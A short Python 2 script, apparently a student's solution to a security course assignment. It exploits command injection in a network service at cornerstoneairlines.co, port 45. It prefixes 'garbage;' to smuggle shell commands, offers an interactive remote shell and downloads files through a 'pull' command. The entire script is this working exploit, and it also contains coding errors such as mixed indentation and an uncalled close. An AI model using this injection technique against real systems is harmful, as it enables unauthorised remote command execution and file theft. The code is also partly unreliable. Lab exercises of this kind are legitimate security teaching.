"""
    Use the same techniques such as (but not limited to):
        1) Sockets
        2) File I/O
        3) raw_input()

    from the OSINT HW to complete this assignment. Good luck!
"""

import socket
import sys
import time

host = "cornerstoneairlines.co" # IP address here
port = 45 # Port here

def execute_cmd(currPath, cmd):

	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((host, port))
	
	

	if (cmd == "help"):
		print "shell: drop into an interactive shell and allow users to gracefully exit\npull <remote-path> <local-path> Download files\nhelp Shows this help menu\nquit Quit the shell"

	elif "pull" in cmd:
		pullCmds = str.split(cmd)           
		f = open(pullCmds[2], "w+")

		s.recv(1024)
		s.send("garbage; cd " + currPath + " ;" + pullCmds[1] + "\n")
		time.sleep(3)
		data = s.recv(1024)
		
		f.write(data)

                  
	else:
		s.recv(1024)
		s.send("garbage; cd " + currPath + " ;" + cmd + "\n")
		time.sleep(3)
		data = s.recv(1024)
		print(data)

 	s.close
		

if __name__ == '__main__':

    outer = True;
    inner = True;
    
    
    while (outer == True):

       cmd = raw_input(">")
       currPath = "/"
       if (cmd == "shell"):

         while (inner != False):

           cmd = raw_input(currPath + ">")

           if cmd == "exit":
              inner = False
		
           elif "cd" in cmd: 
 		currPath = cmd[3: ] 

           else:
              execute_cmd(currPath, cmd)

       if cmd == "quit":
	  exit()
          s.close()











